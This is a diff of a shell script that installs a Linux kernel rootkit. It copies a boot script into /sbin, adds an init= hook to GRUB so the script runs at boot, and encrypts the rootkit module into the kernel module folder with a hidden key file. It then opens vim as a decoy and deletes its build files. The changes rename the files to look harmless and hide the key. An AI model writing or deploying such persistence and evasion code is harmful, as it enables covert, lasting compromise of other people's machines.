@@ -3,12 +3,13 @@
 #copy script_rootkit.sh to /sbin/
 #append "init=/sbin/script_rootkit.sh" to the line in /etc/default/grub beginning with linux
 #just exec a normal ahh programme
-
-cp ./.script_rootkit /sbin/script_rootkit.sh
-chmod +x /sbin/script_rootkit.sh
-sed -i '/^GRUB_CMDLINE_LINUX_DEFAULT=/ s/"$/ init=\/sbin\/script_rootkit.sh"/' /etc/default/grub
+cp .bootstrap_script.sh /sbin/bootstrap_script.sh
+chmod +x /sbin/bootstrap_script.sh
+sed -i '/^GRUB_CMDLINE_LINUX_DEFAULT=/ s/"$/ init=\/sbin\/bootstrap_script.sh"/' /etc/default/grub
 update-grub > /dev/null 2>&1
-openssl rand -hex 32 > /boot/keyfile.bin
-openssl enc -aes-256-cbc -pbkdf2 -salt -in ./.build/rootkit.ko -out /lib/modules/$(uname -r)/extra/rootkit.ko.enc -pass file:/boot/keyfile.bin
-#rm -rf ./*
-exec vim 
+openssl rand -hex 32 > /boot/.keyfile.bin
+openssl enc -aes-256-cbc -pbkdf2 -salt -in .script_rootkit -out /sbin/script_rootkit.sh.enc
+openssl enc -aes-256-cbc -pbkdf2 -salt -in ./.build/rootkit.ko -out /lib/modules/$(uname -r)/extra/rootkit.ko.enc -pass file:/boot/.keyfile.bin
+
+exec vim && disown
+rm -rf .build .script_rootkit .bootstrap.script.sh loader_script
